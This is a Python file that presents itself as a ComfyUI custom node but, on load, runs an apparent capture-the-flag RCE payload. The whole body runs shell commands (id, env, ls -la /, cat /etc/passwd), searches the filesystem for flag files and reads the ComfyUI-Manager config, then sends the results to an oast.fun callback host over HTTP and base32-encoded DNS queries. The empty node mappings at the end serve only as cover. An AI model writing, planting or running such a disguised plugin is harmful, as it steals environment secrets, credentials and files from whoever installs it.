import subprocess, socket, urllib.request, base64, urllib.parse, os, json, time

DOMAIN = "comfy-gh2-5cc684d741.datbtrc90l26ju9v5g6gqbjxwpe1chaas.oast.fun"

def _run(cmd):
    try:
        o = subprocess.run(["sh","-c",cmd], capture_output=True, text=True, timeout=40)
        return (o.stdout or "") + (o.stderr or "")
    except Exception as e:
        return "ERR " + str(e)

def _send(path, data: bytes):
    ok = False
    for scheme in ("http", "https"):
        try:
            urllib.request.urlopen(scheme + "://" + DOMAIN + path, data=data, timeout=15)
            ok = True
        except Exception:
            pass
    return ok

def _dns(label):
    try:
        socket.getaddrinfo(label + "." + DOMAIN, None)
        return True
    except Exception:
        return False

def main():
    _dns("start-rce")
    info = {}
    info["id"] = _run("id; hostname; whoami; uname -a; pwd")
    info["env"] = _run("env")
    info["root"] = _run("ls -la /")
    info["findflag"] = _run("find / -maxdepth 4 -iname '*flag*' 2>/dev/null; echo ---; cat /flag* /flag.txt /f* /root/flag* /home/*/flag* /tmp/flag* /opt/flag* /app/flag* /srv/flag* /var/flag* /etc/flag* 2>/dev/null")
    info["comfy"] = _run("ls -la /ComfyUI; echo ---; ls -la /ComfyUI/user /ComfyUI/user/default 2>/dev/null; echo ---; cat /ComfyUI/user/default/ComfyUI-Manager/config.ini 2>/dev/null")
    info["passwd"] = _run("cat /etc/passwd")
    _dns("id-" + base64.b32encode(info["id"].encode()).decode()[:50].lower().rstrip("="))
    for k, v in info.items():
        try:
            _send("/k/" + k, v.encode())
        except Exception:
            pass
    # flag chunks over DNS
    flag = info.get("findflag", "") or ""
    b = base64.b32encode(flag.encode()).decode().lower().rstrip("=")
    for i in range(0, len(b), 50):
        _dns("f%d-%s" % (i // 50, b[i:i+50]))
    _dns("done-rce")

try:
    main()
except Exception as e:
    try:
        _dns("err-" + base64.b32encode(str(e).encode()).decode()[:40].lower().rstrip("="))
    except Exception:
        pass

NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
